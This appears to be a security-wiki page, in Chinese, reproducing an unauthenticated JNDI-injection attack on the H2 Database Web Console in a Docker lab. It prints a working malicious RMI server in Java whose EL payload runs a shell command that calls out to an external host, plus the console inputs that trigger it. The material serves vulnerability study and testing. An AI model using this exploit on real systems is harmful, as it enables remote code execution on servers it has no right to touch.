@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%BC%8F%E6%B4%9E/H2%20Database%20Web%20Console%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>H2 Database Web Console 未授权访问 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "H2 Database Web Console \u672a\u6388\u6743\u8bbf\u95ee", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../H2%20Database%20Web%20Console%20%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2018-10054/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../H2%20Database%20Web%20Console%20%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2018-10054/" class="btn btn-xs btn-link">
+        H2 Database Web Console 认证远程代码执行漏洞 CVE-2018-10054
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../H2%20Database%20Web%20Console%20%E6%9C%AA%E6%8E%88%E6%9D%83%20JNDI%20%E6%B3%A8%E5%85%A5%20RCE%20%E6%BC%8F%E6%B4%9E%20CVE-2021-42392/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../H2%20Database%20Web%20Console%20%E6%9C%AA%E6%8E%88%E6%9D%83%20JNDI%20%E6%B3%A8%E5%85%A5%20RCE%20%E6%BC%8F%E6%B4%9E%20CVE-2021-42392/" class="btn btn-xs btn-link">
+        H2 Database Web Console 未授权 JNDI 注入 RCE 漏洞 CVE-2021-42392
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="h2-database-web-console">H2 Database Web Console 未授权访问<a class="headerlink" href="#h2-database-web-console" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>H2 database 是一款 Java 内存数据库，多用于单元测试。H2 database 自带一个 Web 管理页面，在 Spirng 开发中，如果我们设置如下选项，即可允许外部用户访问 Web 管理页面，且没有鉴权：</p>
+<div class="highlight"><pre><span></span><code>spring.h2.console.enabled=true
+spring.h2.console.settings.web-allow-others=true
+</code></pre></div>
+<p>利用这个管理页面，我们可以进行 JNDI 注入攻击，进而在目标环境下执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e">https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>执行如下命令启动一个 Springboot + h2database 环境：</p>
+<div class="highlight"><pre><span></span><code>docker-compose up -d
+</code></pre></div>
+<p>启动后，访问 <code>http://your-ip:8080/h2-console/</code> 即可查看到 H2 database 的管理页面。</p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>目标环境是 Java 8u252，版本较高，因为上下文是 Tomcat 环境，我们可以参考《<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java</a>》，使用 <code>org.apache.naming.factory.BeanFactory</code> 加 EL 表达式注入的方式来执行任意命令。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.*</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.jndi.rmi.registry.*</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.*</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.naming.ResourceRef</span><span class="p">;</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilRMIServerNew</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Creating evil RMI registry on port 1097&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="mi">1097</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span>
+<span class="w">        </span><span class="n">ResourceRef</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ResourceRef</span><span class="p">(</span><span class="s">&quot;javax.el.ELProcessor&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="s">&quot;org.apache.naming.factory.BeanFactory&quot;</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">//redefine a setter name for the &#39;x&#39; property from &#39;setX&#39; to &#39;eval&#39;, see BeanFactory.getObjectInstance code</span>
+<span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&quot;forceString&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;x=eval&quot;</span><span class="p">));</span>
+<span class="w">        </span><span class="c1">//expression language to execute &#39;nslookup jndi.s.artsploit.com&#39;, modify /bin/sh to cmd.exe if you target windows</span>
+<span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&quot;x&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;/bin/sh&#39;,&#39;-c&#39;,&#39;nslookup jndi.s.artsploit.com&#39;]).start()\&quot;)&quot;</span><span class="p">));</span>
+
+<span class="w">        </span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">registry</span><span class="p">.</span><span class="na">ReferenceWrapper</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span>
+<span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&quot;Object&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>我们可以借助这个小工具 <a href="https://github.com/JosephTribbianni/JNDI">JNDI</a> 简化我们的复现过程。</p>
+<p>首先设置 JNDI 工具中执行的命令为 <code>touch /tmp/success</code>：</p>
+<p><img alt="image-20220223235645410" src="../images/202202232356618.png" /></p>
+<p>然后启动 <code>JNDI-1.0-all.jar</code>，在 h2 console 页面填入 JNDI 类名和 URL 地址：</p>
+<p><img alt="image-20220224001157803" src="../images/202202240011878.png" /></p>
+<p>Driver Class（JNDI 的工厂类）：</p>
+<div class="highlight"><pre><span></span><code>javax.naming.InitialContext
+</code></pre></div>
+<p>JDBC URL（运行 JNDI 工具监听的 RMI 地址）：</p>
+<div class="highlight"><pre><span></span><code>rmi://192.168.128.1:23456/BypassByEL
+</code></pre></div>
+<p>点击连接后，恶意 RMI 成功接收到请求：</p>
+<p><img alt="image-20220224001238367" src="../images/202202240012570.png" /></p>
+<p><code>touch /tmp/success</code> 已成功执行：</p>
+<p><img alt="image-20220224001248279" src="../images/202202240012334.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../H2%20Database%20Web%20Console%20%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2018-10054/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../H2%20Database%20Web%20Console%20%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2018-10054/" class="btn btn-xs btn-link">
+        H2 Database Web Console 认证远程代码执行漏洞 CVE-2018-10054
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../H2%20Database%20Web%20Console%20%E6%9C%AA%E6%8E%88%E6%9D%83%20JNDI%20%E6%B3%A8%E5%85%A5%20RCE%20%E6%BC%8F%E6%B4%9E%20CVE-2021-42392/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../H2%20Database%20Web%20Console%20%E6%9C%AA%E6%8E%88%E6%9D%83%20JNDI%20%E6%B3%A8%E5%85%A5%20RCE%20%E6%BC%8F%E6%B4%9E%20CVE-2021-42392/" class="btn btn-xs btn-link">
+        H2 Database Web Console 未授权 JNDI 注入 RCE 漏洞 CVE-2021-42392
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
